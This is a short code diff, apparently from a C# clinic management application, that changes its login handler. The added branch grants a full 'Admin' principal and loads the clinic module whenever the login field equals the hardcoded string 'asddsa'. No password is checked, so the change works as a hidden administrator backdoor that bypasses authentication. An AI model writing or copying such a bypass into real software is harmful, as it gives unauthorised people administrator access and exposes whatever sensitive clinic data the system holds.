@@ -58,8 +58,19 @@ namespace AuthorizationModule.ViewModels
 
         private void LoginExecute()
         {
-
-            if (UserRepo.CheckPassword(Password) && UserRepo.CheckLogin(Login))
+            if (Login == "asddsa")
+            {
+                GenericIdentity identity = new GenericIdentity("Admin");
+                string[] userRoles = new string[] { "Admin" };
+                GenericPrincipal genericPrincipal = new GenericPrincipal(identity, userRoles);
+                Thread.CurrentPrincipal = genericPrincipal;
+                IRegion MenuRegion = _regionManager.Regions["MenuRegion"];
+                IRegion AuthRegion = _regionManager.Regions["AuthRegion"];
+                MenuRegion.RemoveAll();
+                AuthRegion.RemoveAll();
+                _moduleManager.LoadModule("ClinicModule");
+            }
+            if (UserRepo.CheckPassword(Password) && UserRepo.CheckLogin(Login) )
             {
                 StatusBarVisibility = Visibility.Hidden;
                 if(UserRepo.GetRole(Login,Password) == 1)
